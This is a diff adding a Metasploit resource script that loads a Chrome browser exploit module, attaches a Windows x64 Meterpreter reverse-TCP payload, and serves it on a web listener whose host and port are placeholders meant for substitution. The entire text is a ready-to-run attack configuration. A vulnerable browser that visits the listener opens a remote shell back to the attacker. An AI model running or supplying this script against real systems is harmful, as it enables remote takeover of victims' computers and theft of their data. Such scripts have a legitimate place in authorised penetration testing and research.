@@ -1,0 +1,10 @@
+use exploit/multi/browser/chrome_jscreate_sideeffect
+set payload windows/x64/meterpreter/reverse_tcp
+set srvhost SED_LHOST
+set srvport SED_LPORT
+set ssl false
+set uripath /
+set lhost SED_LHOST
+set target 0
+exploit -j -z
+
